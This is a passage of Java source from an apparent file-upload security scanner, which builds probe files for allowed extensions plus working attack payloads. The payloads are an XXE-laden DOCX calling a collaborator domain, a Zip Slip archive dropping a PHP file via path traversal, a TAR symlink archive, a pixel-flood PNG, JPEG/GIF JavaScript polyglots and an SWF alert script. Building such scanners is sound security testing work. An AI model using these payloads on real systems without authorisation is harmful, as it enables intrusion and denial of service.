            payloads.add(new PayloadDefinition("Allowed Extension: XML (.xml)", category, "probe_test.xml", "application/xml", xmlContent, token));
            String htmlContent = "<!DOCTYPE html><html><head><title>Probe</title></head><body><h1>Upload Scanner Probe: " + token + "</h1></body></html>";
            payloads.add(new PayloadDefinition("Allowed Extension: HTML (.html)", category, "probe_test.html", "text/html", htmlContent, token));
            String jsContent = "// Upload Scanner Probe\nconsole.log(\"Allowed Extension Probe: " + token + "\");\n";
            payloads.add(new PayloadDefinition("Allowed Extension: JavaScript (.js)", category, "probe_test.js", "application/javascript", jsContent, token));
            String cssContent = "/* Upload Scanner Probe: " + token + " */\nbody { color: #222; }\n";
            payloads.add(new PayloadDefinition("Allowed Extension: CSS (.css)", category, "probe_test.css", "text/css", cssContent, token));
            String yamlContent = "probe: allowed_extension\nextension: yaml\ntoken: \"" + token + "\"\n";
            payloads.add(new PayloadDefinition("Allowed Extension: YAML (.yaml)", category, "probe_test.yaml", "application/x-yaml", yamlContent, token));
        }

        // 4. Archives
        if (config.isTestExtArchives()) {
            payloads.add(new PayloadDefinition("Allowed Extension: ZIP (.zip)", category, "probe_test.zip", "application/zip", createMinimalZipArchive(token), token));
            payloads.add(new PayloadDefinition("Allowed Extension: TAR (.tar)", category, "probe_test.tar", "application/x-tar", createMinimalTarArchive(token), token));
            payloads.add(new PayloadDefinition("Allowed Extension: GZIP (.gz)", category, "probe_test.gz", "application/gzip", createMinimalGzipArchive(token), token));
            payloads.add(new PayloadDefinition("Allowed Extension: 7-Zip (.7z)", category, "probe_test.7z", "application/x-7z-compressed", createMinimal7zArchive(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: RAR (.rar)", category, "probe_test.rar", "application/vnd.rar", createMinimalRarArchive(), token));
        }

        // 5. Media (Audio & Video)
        if (config.isTestExtMedia()) {
            payloads.add(new PayloadDefinition("Allowed Extension: MP3 (.mp3)", category, "probe_test.mp3", "audio/mpeg", createMinimalMp3(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: WAV (.wav)", category, "probe_test.wav", "audio/wav", createMinimalWav(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: MP4 (.mp4)", category, "probe_test.mp4", "video/mp4", createMinimalMp4(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: AVI (.avi)", category, "probe_test.avi", "video/x-msvideo", createMinimalAvi(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: QuickTime (.mov)", category, "probe_test.mov", "video/quicktime", createMinimalMov(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: Matroska (.mkv)", category, "probe_test.mkv", "video/x-matroska", createMinimalMkv(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: Ogg (.ogg)", category, "probe_test.ogg", "audio/ogg", createMinimalOgg(), token));
        }

        // 6. Custom Extensions
        String custom = config.getCustomExtensions();
        if (custom != null && !custom.trim().isEmpty()) {
            String[] exts = custom.split("[,;\\s]+");
            for (String ext : exts) {
                ext = ext.trim().replaceAll("^\\.+", "");
                if (!ext.isEmpty()) {
                    String fn = "probe_custom." + ext;
                    String content = "Upload Scanner Custom Extension Probe: " + ext + " | " + token + "\n";
                    payloads.add(new PayloadDefinition("Allowed Extension: Custom (." + ext + ")", category, fn, "application/octet-stream", content, token));
                }
            }
        }

        return payloads;
    }

    // ──────────────────────────────────────────────────────────────────
    // In-Memory Binary & Archive Builders
    // ──────────────────────────────────────────────────────────────────

    /**
     * Builds a valid Microsoft Word (.docx) ZIP package embedding an XXE payload in word/document.xml.
     */
    public static byte[] createOfficeDocxXxe(String collaboratorDomain) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            // 1. [Content_Types].xml
            String contentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n" +
                    "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n" +
                    "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n" +
                    "  <Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>\n" +
                    "</Types>";
            zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zos.write(contentTypes.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            // 2. _rels/.rels
            String rels = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n" +
                    "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/>\n" +
                    "</Relationships>";
            zos.putNextEntry(new ZipEntry("_rels/.rels"));
            zos.write(rels.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            // 3. word/document.xml with XXE injection
            String docXml = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<!DOCTYPE test [\n" +
                    "  <!ENTITY % xxe SYSTEM \"http://" + collaboratorDomain + "/docx_xxe\">\n" +
                    "  %xxe;\n" +
                    "]>\n" +
                    "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\n" +
                    "  <w:body>\n" +
                    "    <w:p><w:r><w:t>UploadScanner XXE Verification Document</w:t></w:r></w:p>\n" +
                    "  </w:body>\n" +
                    "</w:document>";
            zos.putNextEntry(new ZipEntry("word/document.xml"));
            zos.write(docXml.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    /**
     * Builds a valid ZIP archive containing Zip Slip directory traversal entries.
     */
    public static byte[] createZipSlipArchive(String token) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            ZipEntry slip1 = new ZipEntry("../../../../traversal_shell.php");
            zos.putNextEntry(slip1);
            zos.write(("<?php echo '" + token + "'; ?>").getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            ZipEntry slip2 = new ZipEntry("../../web.config");
            zos.putNextEntry(slip2);
            zos.write(("<configuration><!-- " + token + " --></configuration>").getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    /**
     * Builds a minimal TAR archive containing a symlink entry to targetPath.
     */
    public static byte[] createTarSymlinkArchive(String targetPath) {
        byte[] tarBlock = new byte[1024];
        byte[] nameBytes = "symlink_file".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(nameBytes, 0, tarBlock, 0, Math.min(nameBytes.length, 99));

        byte[] mode = "0000777\0".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(mode, 0, tarBlock, 100, mode.length);

        byte[] size = "00000000000\0".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(size, 0, tarBlock, 124, size.length);

        tarBlock[156] = '2'; // Typeflag 2 = Symbolic link

        byte[] linkBytes = targetPath.getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(linkBytes, 0, tarBlock, 157, Math.min(linkBytes.length, 99));

        byte[] magic = "ustar  \0".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(magic, 0, tarBlock, 257, magic.length);

        int checksum = 8 * ' ';
        for (int i = 0; i < 512; i++) {
            if (i < 148 || i >= 156) {
                checksum += (tarBlock[i] & 0xFF);
            }
        }
        String chkStr = String.format("%06o\0 ", checksum);
        byte[] chkBytes = chkStr.getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(chkBytes, 0, tarBlock, 148, Math.min(chkBytes.length, 8));

        return tarBlock;
    }

    /**
     * Builds a 1x1 PNG image with dimensions modified to 65535x65535 (Pixel Flood DoS).
     */
    public static byte[] createPixelFloodPng() {
        return new byte[] {
                (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
                (byte) 0x00, (byte) 0x00, (byte) 0xFF, (byte) 0xFF,
                (byte) 0x00, (byte) 0x00, (byte) 0xFF, (byte) 0xFF,
                0x08, 0x06, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00
        };
    }

    /**
     * Authentic PortSwigger JPEG + JS CSP Polyglot ported from UploadScanner.py.
     */
    public static byte[] createJpegCspPolyglot() {
        String baseB64 = "/9j/4Ak6SkZJRi8qAQEASABI" +
                "A".repeat(3096) +
                "Ki89YWxlcnQoIkJ1cnAgcm9ja3MuIik7Lyr/2wBDAB4UFhoWEx4aGBohHx4jLEowLCkpLFtBRDZKa15xb2leaGZ2haqQdn6hgGZolMqWobC1v8C/c4" +
                "7R4M+53qq7v7f/2wBDAR8hISwnLFcwMFe3emh6t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7e3t7f/wAARCABE" +
                "AEQDAREAAhEBAxEB/8QAGgAAAwEBAQEAAAAAAAAAAAAAAAIEBQMGAf/EADEQAAEDAgEKBQQDAQAAAAAAAAEAAgMEEZEFEhMhMTNBUVKBFBUiU9EyYX" +
                "GhNEJzsf/EABgBAQEBAQEAAAAAAAAAAAAAAAADBAEC/8QAHxEBAAICAwEBAQEAAAAAAAAAAAEDAhESMTITIVFB/9oADAMBAAIRAxEAPwCfSye4/FAa" +
                "WT3H4oDSye4/FB2pJJDVwgvcRnt4/dBq5ScWujsSNR2FQunpopiJ2kD39TsVn3K+oMHu6jim5NQYPd1HFc3JqF9GSYdZvrWqnyy2+nmlZIIBBs5Mox" +
                "Tx+Jn1OtcA/BR8pM6/XYjc6hyqJzPJnbGjYFjzy5S24YcY0QKb0YIGC4L6Lc91rp8sl3p5tWSCDSyVQ6RwnlHoH0g8Sg61tVpn5jD6B+1msz3+Q11" +
                "V8Y3PaYKKxwuOGCBguC+i3Pda6fLJd6ebVkjQ6PSN02dmX15u0oNhuV6VrQ1scgAFgA0fKBo8qU0kjWNjku4gC7Rx7po2MpgB0dhwKz3f400dSkCzr" +
                "mCBguC+i3Pda6fLJd6ebVkggEHWj/lwf6N/6gNrKEb5HMzGl1gb2ChbjM60vTlEb2lFPN7bsFHhl/F+eP9Do3sF3NIH3C8zjMdkZRPQC8vS+i3Pda" +
                "6fLJd6ebVkggEDRPMUrJALlrg634QaPnUnssxQaUErzT6WdojO23ILkzERuXYiZnUIZ5jM+51AbAsWefKWzDDjBQvD2votz3WunyyXenm1ZIIBAINL" +
                "JVDnkVEo9A+kHj90FFXUaV2a0+gftZLM+U6jprrw4xue3AKSpguC+i3Pda6fLJd6ebVkggEHSnYJKiJjtbXPAOKDbr5DFGyJgzWkcOXJRuymI0vTjE" +
                "zuUIWVpMEDBcF9Fue610+WS70z/LIeqTEfCskPLIeqTEfCA8sh6pMR8IHhydEyZjw592uBFyOf4QW1UDZi0uJFuSnnjGXatec49OHg4+bsVP5Qp9ZN" +
                "4SPm7Fc+UOfWX3wrObk+UH1lRAwRssL2vxVsMYxjUJKi8vL//Z";
        return Base64.getDecoder().decode(baseB64);
    }

    /**
     * Authentic ThinkFu GIF89a + JS CSP Polyglot ported from UploadScanner.py.
     */
    public static byte[] createGifCspPolyglot() {
        String baseB64 = "R0lGODlhPSAnIKUkAAAAACgAAFkAAGRkZICAgI6OjpaWlpmZmaoAAKqqqrwAAL+/v8YAAMvLy8wAANQAANsAANsxMd7e3t8/P+JRUeNbW+Zqaufn5+h" +
                "7e+uHh+uKiu2UlPGrq/KxsfS+vvTDw/fNzfnc3Prh4f39/f" + "/".repeat(111) +
                "yH+Jztkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgianNvdXRwdXQiKS5pbm5lckhUTUwgPSAiVGhpbmtGdSByZWNrb25zIENhamEgaXMgcmF0aGVyIG5" +
                "lYXQuIjsgLyogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAQgICAgACwAAAAAjwBYAAAG/" +
                "sCRcEgsGo/IpHLJbDqfxod0Cq1ar9isVjjtSrfgsHiM9HrJ6LTaaTav33B12x2v27Pz7n3Pb+b1fYGCQ1QjbYOIfYBchYmOdY2PknuLk5ZxlZeaaZm" +
                "bnmBnn6KgnaOmT6Wnqkqhq65Lra+yUamzr7G2s3S5tru8sr6/rrjCqsHFp8fIo8rLn83Om9BQANXW19jYRtZaIhUdIGvcWIdb2efoAETaVxMR7xEYa" +
                "exW5Vnp+OznVhgV/v4URJDZV4+YlXwI1Y0g+KSBhQwQI3IYmO3KNCcJ8wlh6GSBhg4gQ3qgSA/VxSYZ0w3h2OTCxBAwRYQjea2gwYMpS7J0smFI/og" +
                "OaHYysRe0ohKW1Zp8ECLwiMJtT5EI3VjmJJapKyuqvEIPnVSjRUoyqgUG68acSaGOy1oTodqaYcEasnpVrlO0adfpxBt1oV2vhOhytfsWrd69fA/DP" +
                "cvxD9Gxke6KLZxT8Vq/idkuxkfEMbHHlPuGzmg5L+bMp8dxDuw58tybmi9LBrs6tenVtffVhlxoDi3YjBd/JQzYdtTisdcaLlIOtO+jhONONv6Uo9D" +
                "ilX8Dcn7SrPHZm+VeZ5iyaijuwIPLDg1eufjo2BOa3/74OfTppUVTT34cPnnS2vV2DGjt6ZdfgdW9N1188gX4xWudEMjefcLxlyBiFarnHoCd/rlhH" +
                "2+uFbjEeLQpmOF+GqqzFWt6oEfWgRSuh+J3/CFYI3VR0VGfhBMmQWJXJsrIIFyrNedLHoH5GB2M0gGJoZD/OWnUIR8i+ZqS+N3YZHhPmmahljhCSAV" +
                "RVoYIpoijgfkjlxWmo+ObSJLl3ZobCkdnXkihA2ecf4y45JkpXminfyVOdk4Au/QpZno0YnmibUw2umV/C2IjQKL2WclElpY56qWhj0La6XDVKHDkZ" +
                "4xK94SMcSk53KYGsqrXotEY08oBBwyB6wi49rrrr7nWismtvBarqxC/HhussGvs0iuvuxoLbK7PMttsJdRGiyyy1CprrRyxPFttsNNK+y0aUoKdy0e" +
                "66t6RaruKvAhvIO/O66689lJiZr6C4MuvHf7+C0fAAr9BcMHgPoDwvZHsu/AYRj748LWOTTywZxYbXHHGFH/IMbqafpxwvSKTc3AYQQAAIf4qLyAvL" +
                "yAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgBCAgICAAOw==";
        return Base64.getDecoder().decode(baseB64);
    }

    /**
     * Minimal SWF binary header with ActionScript snippet.
     */
    public static byte[] createSwfPayload(String token) {
        String script = "getURL('javascript:alert(\"" + token + "\")');";
        byte[] scriptBytes = script.getBytes(StandardCharsets.US_ASCII);
        byte[] header = new byte[] {
                'F', 'W', 'S', 0x0A,
                (byte) (scriptBytes.length + 32), 0x00, 0x00, 0x00,
                0x78, 0x00, 0x05, 0x5F, 0x00, 0x00, 0x0F, (byte) 0xA0, 0x00,
                0x00, 0x18, 0x01, 0x00
        };
        byte[] swf = new byte[header.length + scriptBytes.length];
        System.arraycopy(header, 0, swf, 0, header.length);
        System.arraycopy(scriptBytes, 0, swf, header.length, scriptBytes.length);
        return swf;
    }

    // ──────────────────────────────────────────────────────────────────
    // Allowed Extension Probe Binary Builders
    // ──────────────────────────────────────────────────────────────────

    public static byte[] createMinimalJpeg() {
        return new byte[] {
                (byte) 0xFF, (byte) 0xD8, // SOI
                (byte) 0xFF, (byte) 0xE0, // APP0
                0x00, 0x10, // length = 16
                0x4A, 0x46, 0x49, 0x46, 0x00, // "JFIF\0"
                0x01, 0x01, // v1.1
                0x01, // units (dpi)
                0x00, 0x48, 0x00, 0x48, // 72x72 dpi
                0x00, 0x00, // thumbnail 0x0
                (byte) 0xFF, (byte) 0xD9 // EOI
        };
    }

    public static byte[] createMinimalPng() {
        return new byte[] {
                (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG magic
                0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, // IHDR
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, // 1x1
                0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, (byte) 0xC4, (byte) 0x89, // CRC
                0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41, 0x54, // IDAT
                0x78, (byte) 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00, 0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, (byte) 0xB4,
                0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, (byte) 0xAE, 0x42, 0x60, (byte) 0x82 // IEND
        };
    }

    public static byte[] createMinimalGif() {
        return new byte[] {
                0x47, 0x49, 0x46, 0x38, 0x39, 0x61, // GIF89a
                0x01, 0x00, 0x01, 0x00, // 1x1
                (byte) 0x80, 0x00, 0x00,
                (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, // white
                0x00, 0x00, 0x00, // black
                0x21, (byte) 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00,
                0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                0x02, 0x02, 0x44, 0x01, 0x00, 0x3B // trailer
        };
    }

    public static byte[] createMinimalWebp() {
        return new byte[] {
                0x52, 0x49, 0x46, 0x46, // RIFF
                0x1A, 0x00, 0x00, 0x00, // size 26
                0x57, 0x45, 0x42, 0x50, // WEBP
                0x56, 0x50, 0x38, 0x4C, // VP8L
                0x0E, 0x00, 0x00, 0x00, // chunk size 14
                0x2F, 0x00, 0x00, 0x00, 0x00, // 1x1
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };
    }

    public static byte[] createMinimalBmp() {
        return new byte[] {
                0x42, 0x4D, // "BM"
                0x3A, 0x00, 0x00, 0x00, // size 58 bytes
                0x00, 0x00, 0x00, 0x00,
                0x36, 0x00, 0x00, 0x00, // offset 54
                0x28, 0x00, 0x00, 0x00, // header size 40
                0x01, 0x00, 0x00, 0x00, // width 1
                0x01, 0x00, 0x00, 0x00, // height 1
                0x01, 0x00, // planes 1
                0x18, 0x00, // 24-bit
                0x00, 0x00, 0x00, 0x00,
                0x04, 0x00, 0x00, 0x00, // image size 4
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, 0x00
        };
    }

    public static byte[] createMinimalIco() {
        byte[] bmp = createMinimalBmp();
        byte[] ico = new byte[6 + 16 + bmp.length];
        ico[2] = 0x01; // icon type
        ico[4] = 0x01; // count 1
        ico[6] = 0x01; // width 1
        ico[7] = 0x01; // height 1
        ico[10] = 0x01; // planes
        ico[12] = 0x18; // 24 bpp
        int bmpLen = bmp.length;
        ico[14] = (byte) (bmpLen & 0xFF);
        ico[15] = (byte) ((bmpLen >> 8) & 0xFF);
        ico[18] = 22; // offset
        System.arraycopy(bmp, 0, ico, 22, bmp.length);
        return ico;
    }

    public static byte[] createMinimalTiff() {
        return new byte[] {
                0x49, 0x49, 0x2A, 0x00, // II*\0 (little endian)
                0x08, 0x00, 0x00, 0x00, // offset
                0x00, 0x00
        };
    }

    public static byte[] createMinimalAvif() {
        return new byte[] {
                0x00, 0x00, 0x00, 0x1C, // size 28
                0x66, 0x74, 0x79, 0x70, // "ftyp"
                0x61, 0x76, 0x69, 0x66, // "avif"
                0x00, 0x00, 0x00, 0x00,
                0x61, 0x76, 0x69, 0x66,
                0x6D, 0x69, 0x66, 0x31
        };
    }

    public static byte[] createMinimalPdf(String token) {
        String pdf = "%PDF-1.4\n" +
                "1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n" +
                "2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n" +
                "3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 100 100]/Contents 4 0 R>>endobj\n" +
                "4 0 obj<</Length 44>>stream\n" +
                "BT /F1 12 Tf 10 50 Td (" + token + ") Tj ET\n" +
                "endstream\nendobj\n" +
                "xref\n0 5\n0000000000 65535 f \n" +
                "0000000009 00000 n \n0000000052 00000 n \n0000000101 00000 n \n0000000174 00000 n \n" +
                "trailer<</Size 5/Root 1 0 R>>\nstartxref\n268\n%%EOF\n";
        return pdf.getBytes(StandardCharsets.US_ASCII);
    }

    public static byte[] createMinimalOleCfbf(String format) {
        byte[] cfbf = new byte[512];
        cfbf[0] = (byte) 0xD0;
        cfbf[1] = (byte) 0xCF;
        cfbf[2] = (byte) 0x11;
        cfbf[3] = (byte) 0xE0;
        cfbf[4] = (byte) 0xA1;
        cfbf[5] = (byte) 0xB1;
        cfbf[6] = (byte) 0x1A;
        cfbf[7] = (byte) 0xE1;
        cfbf[28] = (byte) 0xFE;
        cfbf[29] = (byte) 0xFF;
        cfbf[30] = 0x09;
        cfbf[32] = 0x06;
        byte[] label = ("Upload Scanner Allowed Extension Probe: " + format).getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(label, 0, cfbf, 64, Math.min(label.length, 200));
        return cfbf;
    }

    public static byte[] createMinimalDocxBenign(String token) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            String contentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n" +
                    "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n" +
                    "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n" +
                    "  <Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>\n" +
                    "</Types>";
            zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zos.write(contentTypes.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            String rels = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n" +
                    "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/>\n" +
                    "</Relationships>";
            zos.putNextEntry(new ZipEntry("_rels/.rels"));
            zos.write(rels.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            String docXml = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\n" +
                    "  <w:body><w:p><w:r><w:t>Upload Scanner Allowed Extension Probe: " + token + "</w:t></w:r></w:p></w:body>\n" +
                    "</w:document>";
            zos.putNextEntry(new ZipEntry("word/document.xml"));
            zos.write(docXml.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    public static byte[] createMinimalXlsxBenign(String token) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            String contentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n" +
                    "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n" +
                    "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n" +
                    "  <Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/>\n" +
                    "</Types>";
            zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zos.write(contentTypes.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            String rels = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n" +
                    "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\n" +
                    "</Relationships>";
            zos.putNextEntry(new ZipEntry("_rels/.rels"));
            zos.write(rels.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            String sheetXml = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\"/></sheets></workbook>";
            zos.putNextEntry(new ZipEntry("xl/workbook.xml"));
            zos.write(sheetXml.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    public static byte[] createMinimalPptxBenign(String token) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            String contentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n" +
                    "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n" +
                    "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n" +
                    "  <Override PartName=\"/ppt/presentation.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml\"/>\n" +
                    "</Types>";
            zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zos.write(contentTypes.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            String rels = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n" +
                    "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"ppt/presentation.xml\"/>\n" +
                    "</Relationships>";
            zos.putNextEntry(new ZipEntry("_rels/.rels"));
            zos.write(rels.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            String presXml = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<p:presentation xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\"><p:sldMasterIdLst/><p:sldIdLst/></p:presentation>";
            zos.putNextEntry(new ZipEntry("ppt/presentation.xml"));
            zos.write(presXml.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    public static byte[] createMinimalOdtBenign(String token) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            ZipEntry mimeEntry = new ZipEntry("mimetype");
            zos.putNextEntry(mimeEntry);
            zos.write("application/vnd.oasis.opendocument.text".getBytes(StandardCharsets.US_ASCII));
            zos.closeEntry();

            ZipEntry contentEntry = new ZipEntry("content.xml");
            zos.putNextEntry(contentEntry);
            zos.write(("<?xml version=\"1.0\" encoding=\"UTF-8\"?><office:document-content xmlns:office=\"urn:oasis:names:tc:opendocument:xmlns:office:1.0\" xmlns:text=\"urn:oasis:names:tc:opendocument:xmlns:text:1.0\"><office:body><office:text><text:p>Upload Scanner Allowed Extension Probe: " + token + "</text:p></office:text></office:body></office:document-content>").getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    public static byte[] createMinimalZipArchive(String token) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
            ZipEntry entry = new ZipEntry("probe.txt");
            zos.putNextEntry(entry);
            zos.write(("Upload Scanner Allowed Extension Probe: " + token).getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    public static byte[] createMinimalTarArchive(String token) {
        byte[] tarBlock = new byte[1024];
        byte[] nameBytes = "probe.txt".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(nameBytes, 0, tarBlock, 0, Math.min(nameBytes.length, 99));

        byte[] content = ("Upload Scanner Allowed Extension Probe: " + token).getBytes(StandardCharsets.UTF_8);
        byte[] mode = "0000644\0".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(mode, 0, tarBlock, 100, mode.length);

        String sizeStr = String.format("%011o\0", content.length);
        byte[] size = sizeStr.getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(size, 0, tarBlock, 124, size.length);

        tarBlock[156] = '0'; // Regular file

        byte[] magic = "ustar  \0".getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(magic, 0, tarBlock, 257, magic.length);

        int checksum = 8 * ' ';
        for (int i = 0; i < 512; i++) {
            if (i < 148 || i >= 156) {
                checksum += (tarBlock[i] & 0xFF);
            }
        }
        String chkStr = String.format("%06o\0 ", checksum);
        byte[] chkBytes = chkStr.getBytes(StandardCharsets.US_ASCII);
        System.arraycopy(chkBytes, 0, tarBlock, 148, Math.min(chkBytes.length, 8));

        System.arraycopy(content, 0, tarBlock, 512, Math.min(content.length, 512));
        return tarBlock;
    }

    public static byte[] createMinimalGzipArchive(String token) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (GZIPOutputStream gzos = new GZIPOutputStream(baos)) {
            gzos.write(("Upload Scanner Allowed Extension Probe: " + token).getBytes(StandardCharsets.UTF_8));
        } catch (IOException ignored) {}
        return baos.toByteArray();
    }

    public static byte[] createMinimal7zArchive() {
        return new byte[] {
